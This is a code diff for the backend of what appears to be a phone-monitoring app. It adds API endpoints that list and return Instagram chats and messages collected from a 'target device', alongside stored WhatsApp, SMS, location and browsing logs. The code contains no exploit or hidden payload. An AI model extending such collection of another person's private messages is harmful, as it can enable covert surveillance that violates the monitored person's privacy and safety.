@@ -223,6 +223,9 @@ router.delete("/:id", requireAuth, async (req, res, next) => {
     const deviceId = req.params.id;
     await client.query("BEGIN");
     await client.query("DELETE FROM whatsapp_messages WHERE device_id = $1", [deviceId]);
+    await client.query("DELETE FROM whatsapp_chats WHERE device_id = $1", [deviceId]);
+    await client.query("DELETE FROM instagram_messages WHERE device_id = $1", [deviceId]);
+    await client.query("DELETE FROM instagram_chats WHERE device_id = $1", [deviceId]);
     await client.query("DELETE FROM location_logs WHERE device_id = $1", [deviceId]);
     await client.query("DELETE FROM web_history_logs WHERE device_id = $1", [deviceId]);
     await client.query("DELETE FROM sms_logs WHERE device_id = $1", [deviceId]);
@@ -861,6 +864,158 @@ router.get("/:id/whatsapp/db-check", requireAuth, async (req, res, next) => {
       messages: msgs.rows,
       chats: chats.rows,
     });
+  } catch (err) {
+    next(err);
+  }
+});
+
+/**
+ * GET /api/devices/:id/instagram/chats
+ * Returns all distinct Instagram chats and direct counterparties with last_message and counts.
+ */
+router.get("/:id/instagram/chats", requireAuth, async (req, res, next) => {
+  try {
+    const device = await checkDeviceAccess(req.params.id, req.auth);
+    if (!device) return res.status(404).json({ error: "Device not found" });
+
+    const query = `
+      WITH all_chats AS (
+        SELECT chat_name,
+               username,
+               last_message,
+               last_message_at,
+               false AS is_outgoing
+        FROM instagram_chats
+        WHERE device_id = $1
+        UNION ALL
+        SELECT chat_name,
+               sender AS username,
+               message_text AS last_message,
+               message_time AS last_message_at,
+               is_outgoing
+        FROM instagram_messages
+        WHERE device_id = $1 AND chat_name IS NOT NULL AND TRIM(chat_name) != ''
+      ),
+      msg_counts AS (
+        SELECT LOWER(TRIM(chat_name)) AS canonical_name,
+               COUNT(*)::int AS total_messages
+        FROM instagram_messages
+        WHERE device_id = $1
+        GROUP BY LOWER(TRIM(chat_name))
+      )
+      SELECT (ARRAY_AGG(ac.chat_name ORDER BY LENGTH(ac.chat_name) DESC))[1] AS chat_name,
+             COALESCE(mc.total_messages, 0) AS total_messages,
+             MAX(ac.last_message_at) AS last_message_at,
+             (ARRAY_AGG(ac.last_message ORDER BY ac.last_message_at DESC))[1] AS last_message,
+             COALESCE((ARRAY_AGG(ac.is_outgoing ORDER BY ac.last_message_at DESC))[1], false) AS last_is_outgoing,
+             (ARRAY_AGG(ac.username ORDER BY ac.last_message_at DESC))[1] AS username
+      FROM all_chats ac
+      LEFT JOIN msg_counts mc ON mc.canonical_name = LOWER(TRIM(ac.chat_name))
+      WHERE ac.chat_name IS NOT NULL
+        AND TRIM(ac.chat_name) != ''
+        AND LOWER(TRIM(ac.chat_name)) NOT IN (
+          'instagram', 'direct', 'meta ai', 'search', 'reels', 'explore', 'notifications'
+        )
+      GROUP BY LOWER(TRIM(ac.chat_name))
+      ORDER BY MAX(ac.last_message_at) DESC
+      LIMIT 1000;
+    `;
+
+    const result = await pool.query(query, [req.params.id]);
+    res.json(result.rows);
+  } catch (err) {
+    next(err);
+  }
+});
+
+/**
+ * GET /api/devices/:id/instagram/messages
+ * Query param ?chat=... fetches conversation history for that specific Instagram chat.
+ */
+router.get("/:id/instagram/messages", requireAuth, async (req, res, next) => {
+  try {
+    const device = await checkDeviceAccess(req.params.id, req.auth);
+    if (!device) return res.status(404).json({ error: "Device not found" });
+
+    const chatName = req.query.chat || req.query.chatName || req.query.name;
+    const days = req.query.days ? parseInt(req.query.days, 10) : null;
+    let query = `SELECT id, chat_name, sender, message_text,
+                        CASE
+                          WHEN is_outgoing = true THEN true
+                          WHEN LOWER(TRIM(sender)) IN ('me', 'you', 'target device') THEN true
+                          WHEN message_text LIKE 'You: %' THEN true
+                          WHEN message_text LIKE 'You sent %' THEN true
+                          WHEN message_text LIKE 'You reacted %' THEN true
+                          ELSE false
+                        END AS is_outgoing,
+                        message_time, media_type, media_path, reel_url
+                 FROM instagram_messages
+                 WHERE device_id = $1
+                   AND chat_name IS NOT NULL
+                   AND TRIM(chat_name) != ''`;
+    const params = [req.params.id];
+    let idx = 2;
+    if (chatName) {
+      const cleanChat = String(chatName).trim();
+      query += ` AND (
+        LOWER(TRIM(chat_name)) = LOWER(TRIM($${idx}))
+        OR LOWER(TRIM(sender)) = LOWER(TRIM($${idx}))
+        OR LOWER(TRIM(chat_name)) LIKE '%' || LOWER(TRIM($${idx})) || '%'
+        OR LOWER(TRIM($${idx})) LIKE '%' || LOWER(TRIM(chat_name)) || '%'
+      )`;
+      params.push(cleanChat);
+      idx += 1;
+    }
+
+    if (!chatName && days && !isNaN(days) && days > 0) {
+      query += ` AND message_time >= (NOW() - ($${idx} * INTERVAL '1 day'))`;
+      params.push(days);
+      idx += 1;
+    }
+
+    let finalQuery = `SELECT * FROM (${query} ORDER BY message_time DESC LIMIT 500) sub ORDER BY message_time ASC`;
+    let result = await pool.query(finalQuery, params);
+
+    // If no direct conversation rows are stored yet for this chat, check instagram_chats for last_message preview
+    if (result.rows.length === 0 && chatName) {
+      const cleanChat = String(chatName).trim();
+      const chatFallback = await pool.query(
+        `SELECT chat_name, username, last_message, last_message_at 
+         FROM instagram_chats 
+         WHERE device_id = $1 
+           AND (
+             LOWER(TRIM(chat_name)) = LOWER(TRIM($2))
+             OR LOWER(TRIM(chat_name)) LIKE '%' || LOWER(TRIM($2)) || '%'
+             OR LOWER(TRIM($2)) LIKE '%' || LOWER(TRIM(chat_name)) || '%'
+           )
+           AND last_message IS NOT NULL 
+         ORDER BY last_message_at DESC LIMIT 1`,
+        [req.params.id, cleanChat]
+      );
+      if (chatFallback.rows.length > 0 && chatFallback.rows[0].last_message) {
+        const row = chatFallback.rows[0];
+        const hasYouPrefix = row.last_message.startsWith("You: ") || row.last_message.startsWith("You sent ") || row.last_message.startsWith("You reacted ");
+        let cleanMsg = row.last_message;
+        if (cleanMsg.startsWith("You: ")) cleanMsg = cleanMsg.slice(5).trim();
+        else if (cleanMsg.startsWith("You sent ")) cleanMsg = cleanMsg.slice(9).trim();
+
+        const reelMatch = cleanMsg.match(/https?:\/\/(?:www\.)?instagram\.com\/(?:reel|p|tv)\/[a-zA-Z0-9_-]+/i);
+
+        result.rows = [{
+          id: -1,
+          chat_name: row.chat_name || cleanChat,
+          sender: hasYouPrefix ? "me" : (row.chat_name || cleanChat),
+          message_text: cleanMsg,
+          is_outgoing: hasYouPrefix,
+          message_time: row.last_message_at || new Date().toISOString(),
+          media_type: reelMatch ? "reel" : null,
+          media_path: null,
+          reel_url: reelMatch ? reelMatch[0] : null
+        }];
+      }
+    }
+
+    res.json(result.rows);
   } catch (err) {
     next(err);
   }
